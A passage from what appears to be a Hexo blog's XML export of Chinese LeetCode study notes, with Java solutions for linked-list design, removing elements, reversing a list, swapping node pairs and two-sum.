&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//虚拟头节点的存在 使得返回index+1个节点&quot;=&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++) &#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果index等于0 新插入的节点就为头节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>,val);</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="comment">//如果index等于链表长度 此时插入的新节点为尾节点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        addAtIndex(size,val);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">    <span class="comment">//如果index大于链表长度 返回null</span></span><br><span class="line">         <span class="keyword">if</span>(index &gt; size) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line">         size++;</span><br><span class="line">         <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">         <span class="comment">//找到要插入节点的前驱</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index ;i++) &#123;</span><br><span class="line">            prev = prev.next;</span><br><span class="line">         &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = prev.next;</span><br><span class="line">        prev.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">     <span class="comment">//同样的判断逻辑</span></span><br><span class="line">     <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     size--;</span><br><span class="line">     <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> head;</span><br><span class="line">     <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">        prev = prev.next;</span><br><span class="line">     &#125;</span><br><span class="line">     prev.next = prev.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h6><p>用双链表操作时需要注意指针操作的逻辑.<br>head.next &#x3D; tail;<br>tail.next &#x3D; head;<br><strong><code>index &lt; (size - 1) / 2</code> 判断用来决定是从头节点还是尾节点进行遍历，这样做是为了提高查找效率</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span> &#123;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        ListNode next,prev;</span><br><span class="line">        ListNode(<span class="type">int</span> x) &#123;val = x;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span> &#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;<span class="keyword">return</span> -<span class="number">1</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过判断 index &lt; (size - 1) / 2 来决定是从头结点还是尾节点遍历，提高效率</span></span><br><span class="line">        <span class="keyword">if</span>(index &lt; (size - <span class="number">1</span>) / <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= size - index - <span class="number">1</span>; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> tail;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = tail;</span><br><span class="line">        newNode.prev = cur.prev;</span><br><span class="line">        cur.prev.next = newNode;</span><br><span class="line">        cur.prev = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;index = <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = cur.next;</span><br><span class="line">        cur.next.prev = newNode;</span><br><span class="line">        newNode.prev = cur;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size || index &lt; <span class="number">0</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next.next.prev = cur;</span><br><span class="line">        cur.next = cur.next.next;</span><br><span class="line">        size--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x2</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x2/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x2/</url>
      
        <content type="html"><![CDATA[<h4 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h4><p>link：<a href="https://leetcode.cn/problems/remove-element/solutions/1689028/by-carlsun-2-fdc4/">27. 移除元素 - 力扣（LeetCode）</a></p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240925141403675.png" alt="image-20240925141403675"></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>1.常规遍历数组，比较vaule值是否相等，若不相等往前拷贝覆盖即可，相等跳过，更新下标（可以理解为数组长度减少）.【时间复杂度O(n) 空间复杂度O(1)】<br>2.快慢指针.快指针遍历进行筛选，慢指针对应常见存储的数组.找到目标vaule后fast和slow指针拉开距离开始遍历维护更新.【时间复杂度O(n) 空间复杂度O(1)】</p><h6 id="拷贝覆盖"><a href="#拷贝覆盖" class="headerlink" title="拷贝覆盖"></a>拷贝覆盖</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">          <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(num != val)&#123;</span><br><span class="line">                nums[k] = num;</span><br><span class="line">                k++; </span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> k;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">removeElement</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(slow = <span class="number">0</span>; fast &lt; nums.length; fast++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != val)&#123;</span><br><span class="line">                nums[slow] = nums[fast];</span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> slow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h5><p>注意多种思路辨析.</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x5</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x5/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x5/</url>
      
        <content type="html"><![CDATA[<h4 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h4><p>link：<a href="https://leetcode.cn/problems/reverse-linked-list/">206. 反转链表 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>与数组不同，链表没必要定义新的链表进行存储【对内存空间的浪费】<br>直接改变next指针即可.<br><strong>注意头节点指向的下一个节点为null</strong></p><h6 id="双指针法"><a href="#双指针法" class="headerlink" title="双指针法"></a>双指针法</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//双指针操作 </span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//记录节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            temp = cur.next;<span class="comment">//保存下一个节点</span></span><br><span class="line">            cur.next = prev;</span><br><span class="line">            <span class="comment">//赋值之后整体向后移动</span></span><br><span class="line"><span class="comment">//注意先移动prev 不如cur已经移动后记录不到prev新的位置</span></span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h6><p>和双指针法是一样的逻辑【升华版】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">      <span class="comment">//prev -&gt; null 初始化 head反转的第一个节点 启动反转操作</span></span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="comment">//更新prev和cur的位置</span></span><br><span class="line">        <span class="keyword">return</span> reverse(cur,temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从后向前递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line">    ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//边缘条件判断</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//递归调用 翻转头节点之后的链表</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">//翻转头节点之后链表的指向</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">//此时的head节点为尾节点, next需要指向null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="两两交换链表中的节点"><a href="#两两交换链表中的节点" class="headerlink" title="两两交换链表中的节点"></a>两两交换链表中的节点</h5><p>link：<a href="https://leetcode.cn/problems/swap-nodes-in-pairs/description/">24. 两两交换链表中的节点 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p><strong>注意在交换之前要先存储需要的值</strong></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="comment">//进行递归</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//交换</span></span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="虚拟头节点"><a href="#虚拟头节点" class="headerlink" title="虚拟头节点"></a>虚拟头节点</h6><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/df4a92582bd1bc37e60fd7f3bd7916a4.png" alt="img"></p><p>我们想实现的是1和2交换，3和 4交换，此时很难不想到借用中间变量实现，不用递归实现【每次单独处理头节点】更优雅.<br>注意5后面是空指针就不用交换<br>判断next.next不为空是为了防止空指针异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> dummy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (prev.next != <span class="literal">null</span> &amp;&amp; prev.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> head.next.next; <span class="comment">// 缓存 next</span></span><br><span class="line">      prev.next = head.next;          <span class="comment">// 将 prev 的 next 改为 head 的 next</span></span><br><span class="line">      head.next.next = head;          <span class="comment">// 将 head.next(prev.next) 的next，指向 head</span></span><br><span class="line">      head.next = temp;               <span class="comment">// 将head 的 next 接上缓存的temp</span></span><br><span class="line">      prev = head;                    <span class="comment">// 步进1位</span></span><br><span class="line">      head = head.next;               <span class="comment">// 步进1位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0x9</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0x9/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0x9/</url>
      
        <content type="html"><![CDATA[<h4 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h4><p>link：<a href="https://leetcode.cn/problems/two-sum/description/">1. 两数之和 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>看到题目描述首先想到用两层for循环解决问题.<br>分别从i位置和j(i+1)位置开始相加遍历判断.<br><strong>注意不越界条件</strong></p><h6 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="comment">//我们要找到2个数之和等于target</span></span><br><span class="line">        <span class="comment">//即我们需要找到nums[i] + nums[j] == target，并且返回他们的下标（i和j），其中i != j</span></span><br><span class="line">        <span class="type">int</span>[] ans = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2</span>]; <span class="comment">//声明一个大小为2的数组用来保存结果</span></span><br><span class="line">        <span class="comment">//我们通过循环来遍历所有的数字</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;  <span class="comment">//用一个变量n保存nums的长度</span></span><br><span class="line">        <span class="comment">//i为第一个数的下标，nums一共有n个数，所以i的取值范围是[0, n-1]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">            <span class="comment">//j为第二个数的下标。</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">                <span class="comment">//对于每个数nums[i]，我们验证一遍其他数（nums[j]）跟它的和是否等于target</span></span><br><span class="line">                <span class="comment">//如果满足条件</span></span><br><span class="line">                <span class="keyword">if</span>(nums[i] + nums[j] == target)&#123;</span><br><span class="line">                    <span class="comment">//将下标写入返回值数组里</span></span><br><span class="line">                    ans[<span class="number">0</span>] = i;</span><br><span class="line">                    ans[<span class="number">1</span>] = j;</span><br><span class="line">                    <span class="comment">//返回</span></span><br><span class="line">                    <span class="keyword">return</span> ans;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//默认返回值</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h6><p><strong>Tips</strong><br><strong>当我们查询一个元素是否出现过或者一个元素是否在集合里时，首先要想到哈希法.</strong></p><p>之前了解到哈希数组的运用是受到大小的限制，如果元素过少会浪费内存空间.<br>set是一个集合，存储的元素只能是一个key.本题不仅要判断y是否存在还要记录y的位置，不适用.</p><p>我们需要一个集合存储我们遍历的元素，对应的key值和value值分别存放元素和下标.(HasMap)</p><h6 id="map的作用"><a href="#map的作用" class="headerlink" title="map的作用"></a>map的作用</h6><p>起到存储的作用，存储我们遍历的数组数据元素和对应下标.<br>遍历数组的时候只需要查询是否有与当前元素匹配的元素即可.【匹配规则target-key &#x3D;&#x3D; 